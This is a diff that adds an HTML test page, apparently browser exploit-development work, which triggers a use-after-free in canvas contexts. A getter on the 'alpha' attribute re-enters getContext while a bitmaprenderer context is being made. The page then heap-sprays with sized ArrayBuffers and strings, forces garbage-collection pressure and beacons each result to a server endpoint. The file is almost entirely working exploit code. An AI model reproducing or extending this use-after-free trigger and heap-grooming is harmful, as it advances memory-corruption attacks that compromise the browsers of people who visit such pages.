@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V534</title>
+<style>body{font:11px monospace;background:#111;color:#0f0;margin:8px}
+#log{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<div id="log">V534 — Canvas UAF diagnostic: is context freed or alive?
+Loading...</div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+='\n'+m}
+var T0=Date.now();
+function B(tag,body){
+  var msg='['+(Date.now()-T0)+'ms] '+(body||'');
+  log('>> '+tag+': '+msg);
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V534-'+tag,false);
+  x.setRequestHeader('Content-Type','text/plain');x.send(msg)}catch(e){}
+}
+
+window.onerror=function(m,s,l,c,e){B('ONERROR',m+' at '+s+':'+l+':'+c)};
+
+B('BOOT',navigator.userAgent);
+
+// === T1: Trigger UAF, immediately test save() with NO spray ===
+setTimeout(function(){
+  try{
+    B('T1-START','trigger UAF + test save without spray');
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var inner = null;
+    var s = {};
+    Object.defineProperty(s, 'alpha', {
+      get: function() { inner = c.getContext('2d'); return true; }
+    });
+    var outer = c.getContext('bitmaprenderer', s);
+    if (!inner) { B('T1-FAIL','no inner ctx'); return; }
+    B('T1-UAF','triggered');
+
+    // Test save() immediately — NO spray, NO GC
+    try {
+      inner.save();
+      B('T1-SAVE1','save() OK');
+    } catch(e) { B('T1-SAVE1-ERR',''+e); }
+
+    // Test lineWidth read
+    try {
+      var lw = inner.lineWidth;
+      B('T1-LW','lineWidth='+lw);
+    } catch(e) { B('T1-LW-ERR',''+e); }
+
+    // Test lineWidth write
+    try {
+      inner.lineWidth = 42.5;
+      var lw2 = inner.lineWidth;
+      B('T1-LW2','set 42.5, read='+lw2);
+    } catch(e) { B('T1-LW2-ERR',''+e); }
+
+    // Test restore
+    try {
+      inner.restore();
+      var lw3 = inner.lineWidth;
+      B('T1-RESTORE','after restore, lw='+lw3+' (expect 1 if save worked)');
+    } catch(e) { B('T1-RESTORE-ERR',''+e); }
+
+    // Multiple saves
+    try {
+      for (var i = 0; i < 10; i++) inner.save();
+      B('T1-MULTI','10 saves OK');
+    } catch(e) { B('T1-MULTI-ERR',''+e); }
+
+    // Test globalAlpha
+    try {
+      var ga = inner.globalAlpha;
+      B('T1-GA','globalAlpha='+ga);
+    } catch(e) { B('T1-GA-ERR',''+e); }
+
+    // Test fillStyle
+    try {
+      var fs = inner.fillStyle;
+      B('T1-FS','fillStyle='+fs);
+    } catch(e) { B('T1-FS-ERR',''+e); }
+
+    window._inner1 = inner;
+    window._canvas1 = c;
+    window._outer1 = outer;
+    B('T1-DONE','context is ALIVE — all reads/writes work');
+
+  } catch(e) { B('T1-ERR',''+e); }
+}, 200);
+
+// === T2: Now spray and test again ===
+setTimeout(function(){
+  try{
+    if (!window._inner1) { B('T2-SKIP','no ctx'); return; }
+    B('T2-START','small spray (10 ABs) then save');
+
+    var spray = [];
+    for (var i = 0; i < 10; i++) spray.push(new ArrayBuffer(768));
+    B('T2-SPRAYED','n=10');
+
+    try {
+      window._inner1.save();
+      B('T2-SAVE','save() OK after 10 ABs');
+    } catch(e) { B('T2-SAVE-ERR',''+e); }
+
+    try {
+      var lw = window._inner1.lineWidth;
+      B('T2-LW','lineWidth='+lw);
+    } catch(e) { B('T2-LW-ERR',''+e); }
+
+    window._spray2 = spray;
+  } catch(e) { B('T2-ERR',''+e); }
+}, 1000);
+
+// === T3: Medium spray ===
+setTimeout(function(){
+  try{
+    if (!window._inner1) { B('T3-SKIP','no ctx'); return; }
+    B('T3-START','medium spray (500 ABs) then save');
+
+    var spray = [];
+    for (var i = 0; i < 500; i++) spray.push(new ArrayBuffer(768));
+    B('T3-SPRAYED','n=500');
+
+    try {
+      window._inner1.save();
+      B('T3-SAVE','save() OK after 500 ABs');
+    } catch(e) { B('T3-SAVE-ERR',''+e); }
+
+    try {
+      var lw = window._inner1.lineWidth;
+      B('T3-LW','lineWidth='+lw);
+    } catch(e) { B('T3-LW-ERR',''+e); }
+
+    window._spray3 = spray;
+  } catch(e) { B('T3-ERR',''+e); }
+}, 2000);
+
+// === T4: Large spray ===
+setTimeout(function(){
+  try{
+    if (!window._inner1) { B('T4-SKIP','no ctx'); return; }
+    B('T4-START','large spray (2000 ABs) then save');
+
+    var spray = [];
+    for (var i = 0; i < 2000; i++) spray.push(new ArrayBuffer(768));
+    B('T4-SPRAYED','n=2000');
+
+    try {
+      window._inner1.save();
+      B('T4-SAVE','save() OK after 2000 ABs');
+    } catch(e) { B('T4-SAVE-ERR',''+e); }
+
+    try {
+      var lw = window._inner1.lineWidth;
+      B('T4-LW','lineWidth='+lw);
+    } catch(e) { B('T4-LW-ERR',''+e); }
+
+    window._spray4 = spray;
+  } catch(e) { B('T4-ERR',''+e); }
+}, 3000);
+
+// === T5: Force GC and test ===
+setTimeout(function(){
+  try{
+    if (!window._inner1) { B('T5-SKIP','no ctx'); return; }
+    B('T5-START','force GC pressure then test');
+
+    // Allocate+free to trigger GC
+    var garbage = [];
+    for (var i = 0; i < 10000; i++) garbage.push({a:i, b:new ArrayBuffer(64)});
+    garbage = null;
+    // Small allocs to pressure GC
+    for (var i = 0; i < 5000; i++) new ArrayBuffer(128);
+
+    B('T5-GC','GC pressure applied');
+
+    try {
+      window._inner1.save();
+      B('T5-SAVE','save() OK after GC');
+    } catch(e) { B('T5-SAVE-ERR',''+e); }
+
+    try {
+      var lw = window._inner1.lineWidth;
+      B('T5-LW','lineWidth='+lw);
+    } catch(e) { B('T5-LW-ERR',''+e); }
+
+  } catch(e) { B('T5-ERR',''+e); }
+}, 5000);
+
+// === T6: What does canvas think its context is? ===
+setTimeout(function(){
+  try{
+    if (!window._canvas1) { B('T6-SKIP','no canvas'); return; }
+    B('T6-START','context identity check');
+
+    // Try getting 2d context again
+    var ctx2d = window._canvas1.getContext('2d');
+    B('T6-GET2D','getContext(2d)='+(ctx2d===null?'null':ctx2d===window._inner1?'SAME':'DIFFERENT'));
+
+    // Try getting bitmaprenderer again
+    var ctxBR = window._canvas1.getContext('bitmaprenderer');
+    B('T6-GETBR','getContext(bitmaprenderer)='+(ctxBR===null?'null':ctxBR===window._outer1?'SAME':'DIFFERENT'));
+
+    // Check if drawing works on the orphaned 2d context
+    try {
+      window._inner1.fillRect(0, 0, 1, 1);
+      B('T6-DRAW','fillRect OK');
+    } catch(e) { B('T6-DRAW-ERR',''+e); }
+
+    // Try toDataURL
+    try {
+      var url = window._canvas1.toDataURL();
+      B('T6-DATAURL','len='+url.length+' prefix='+url.substring(0,30));
+    } catch(e) { B('T6-DATAURL-ERR',''+e); }
+
+  } catch(e) { B('T6-ERR',''+e); }
+}, 7000);
+
+// === T7: Second UAF — test if context freed when wrapper is sole ref ===
+setTimeout(function(){
+  try{
+    B('T7-START','second UAF with explicit deref test');
+    var c2 = document.createElement('canvas');
+    c2.width = 1; c2.height = 1;
+    var inner2 = null;
+    var s2 = {};
+    Object.defineProperty(s2, 'alpha', {
+      get: function() { inner2 = c2.getContext('2d'); return true; }
+    });
+    c2.getContext('bitmaprenderer', s2);
+    if (!inner2) { B('T7-FAIL','no ctx'); return; }
+
+    // Now remove ALL other refs: null the canvas, null the outer
+    c2 = null;
+
+    // Force GC
+    var garbage = [];
+    for (var i = 0; i < 5000; i++) garbage.push(new ArrayBuffer(128));
+    garbage = null;
+    for (var i = 0; i < 5000; i++) new ArrayBuffer(128);
+
+    B('T7-GC','canvas nulled + GC pressure');
+
+    // Test save() — if context freed by GC, this crashes
+    try {
+      inner2.save();
+      B('T7-SAVE','save() OK — context still alive after GC');
+    } catch(e) { B('T7-SAVE-ERR',''+e); }
+
+    try {
+      var lw = inner2.lineWidth;
+      B('T7-LW','lineWidth='+lw);
+    } catch(e) { B('T7-LW-ERR',''+e); }
+
+    // Now spray 768B ABs and test again
+    var spray7 = [];
+    for (var i = 0; i < 2000; i++) spray7.push(new ArrayBuffer(768));
+    B('T7-SPRAYED','n=2000');
+
+    try {
+      inner2.save();
+      B('T7-SAVE2','save() OK after spray');
+    } catch(e) { B('T7-SAVE2-ERR',''+e); }
+
+    try {
+      var lw2 = inner2.lineWidth;
+      B('T7-LW2','lineWidth='+lw2+' after spray');
+    } catch(e) { B('T7-LW2-ERR',''+e); }
+
+  } catch(e) { B('T7-ERR',''+e); }
+}, 9000);
+
+// === T8: Alternate spray — pre-filled strings ===
+setTimeout(function(){
+  try{
+    B('T8-START','string spray test');
+    var c3 = document.createElement('canvas');
+    c3.width = 1; c3.height = 1;
+    var inner3 = null;
+    var s3 = {};
+    Object.defineProperty(s3, 'alpha', {
+      get: function() { inner3 = c3.getContext('2d'); return true; }
+    });
+    c3.getContext('bitmaprenderer', s3);
+    if (!inner3) { B('T8-FAIL','no ctx'); return; }
+
+    // Spray strings instead of ABs
+    // StringImpl header is ~20B, so for 768B alloc: ~748 char string
+    var spray8 = [];
+    var base = '';
+    for (var i = 0; i < 748; i++) base += String.fromCharCode(0x41 + (i % 26));
+    for (var i = 0; i < 2000; i++) {
+      spray8.push(base + String.fromCharCode(0x30 + (i % 10)));
+    }
+    B('T8-SPRAYED','n='+spray8.length+' strlen='+spray8[0].length);
+
+    try {
+      inner3.save();
+      B('T8-SAVE','save() OK after string spray');
+    } catch(e) { B('T8-SAVE-ERR',''+e); }
+
+    try {
+      var lw = inner3.lineWidth;
+      B('T8-LW','lineWidth='+lw);
+    } catch(e) { B('T8-LW-ERR',''+e); }
+
+  } catch(e) { B('T8-ERR',''+e); }
+}, 12000);
+
+setTimeout(function(){B('COMPLETE','all tests done')},15000);
+</script></body></html>
